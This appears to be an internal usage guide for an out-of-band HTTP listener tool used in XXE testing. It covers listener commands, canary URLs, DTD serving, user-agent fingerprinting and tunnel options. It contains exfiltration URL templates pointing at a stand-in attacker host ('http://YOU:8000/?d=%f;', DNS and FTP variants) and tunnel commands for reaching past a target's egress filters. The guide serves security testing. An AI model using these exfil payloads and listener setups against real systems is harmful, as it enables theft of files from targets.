# OOB Listener — deep — running and reading the catch

## `tools/web/oob_listener.py` — the interface

```bash
python3 tools/web/oob_listener.py --help
```

## `serve` — run the listener

```bash
python3 tools/web/oob_listener.py serve --port 8000 --seconds 120 --log /tmp/oob.log
python3 tools/web/oob_listener.py serve --port 8000 --bind 0.0.0.0 --log /tmp/oob.log
python3 tools/web/oob_listener.py serve --port 8000 --seconds 300
```

`--port` the listen-port, `--bind` the interface (default `0.0.0.0`),
`--seconds` the lifetime (default runs until killed), `--log` the
output log-file.

The listener accepts HTTP requests and logs them — method, path,
query, headers, body — the `User-Agent`/`Referer`/`Host` land in the
log.

## `hits` — parse the log

```bash
python3 tools/web/oob_listener.py hits --log /tmp/oob.log
```

Parses the log — prints each captured request — the query-params and
paths are the exfil channel's readout — `?d=<content>` shows the
file content.

## `canary` — a unique-token URL

```bash
python3 tools/web/oob_listener.py canary --base http://YOUR-HOST:8000/
python3 tools/web/oob_listener.py canary --base http://YOUR-HOST:8000/ --name myprobe
```

Emits `http://YOUR-HOST:8000/<token>/` — embed it in the payload —
`hits` output filtered to your canary proves YOUR probe fired — kills
the "a scanner hit me" doubt on shared infra.

## The serving-DTD problem — the DTD must also be fetchable

`oob_listener.py serve` listens — it doesn't serve your `e.dtd`. Two
options:

1. Run `oob_listener serve` on :8000 for the catch + a `python3 -m
   http.server 8080 --directory /tmp` for the DTD — two ports
2. A static-file server that logs — `http.server` + a wrapper, or a
   minimal script that serves `e.dtd` AND logs hits

The clean pattern — serve the DTD on one path, catch exfil on another:

```
http://YOU:8080/e.dtd        — the DTD (http.server)
http://YOU:8000/?d=%f;       — the exfil (oob_listener)
```

## The listener's `Host`/`User-Agent` — the fingerprint

`oob_listener` logs `Host:`/`User-Agent:` — the UA fingerprints the
fetcher: `Java/1.8.0_xxx`, `Apache-HttpClient/4.x`, `libwww-perl/6.x`,
`Python-urllib/3.x`, `curl/7.x`, `GuzzleHttp`, `node-fetch` —
`parser-specifics.md` uses it.

## The raw-capture — the full request

The `--log` file has the verbatim request — method+URI+headers+body —
the file content can hide in:
- the query-string `?d=...`
- the path `/...`
- a custom header the app sends
- the request body (POST exfil)

## The "the listener must be reachable" — the egress requirement

- public IP / a tunnel (`ngrok`, `localhost.run`, `serveo`, `zrok`,
  `pinggy`, `bore`) for a remote target
- `0.0.0.0` bind for a same-network target
- the target's egress must reach you — `denied-conditions.md`

## The "the DNS-only channel" — UDP-53

For DNS-label exfil — `http://%f;.YOU/` — you need a DNS listener on
:53 — `oob_listener` is HTTP — for DNS, `dnsmasq`/`dnschef`/`dnsbin`/
`interactsh`/a raw `socket(SOCK_DGRAM).bind(('',53))` script — the
listener-tool split.

## The "the FTP-channel" — the legacy listener

`ftp://YOU/%f;` — a raw FTP listener captures the command — a
`pyftpdlib`/socket script — `oob_listener` doesn't do FTP.

## The "the hits-log is the evidence" — the ledger

`oob_listener.py hits` output → `--response` in `post-probe` — the
verbatim hit-line IS the evidence — the query/path that carried the
file content.

## The "the listener the target can't reach" — the tunnel options

```
ngrok http 8000
ssh -R 80:localhost:8000 serveo.net
zrok share public http://localhost:8000
bore local 8000 --to bore.pub
cloudflared tunnel --url http://localhost:8000
```

Or a VPS — the public-listener problem.

## The "the hits-order" — the multi-hit sequence

Multiple hits — a chunked exfil lands as several requests — order them
by timestamp/sequence-param — the `?i=1`/`?i=2` index in your URL
carries the order.

## The "the hits-log is append-only" — the lifetime

The `--seconds` lifetime ends the listener — keep it alive for the
session — restart if it expires — the log is persistent.
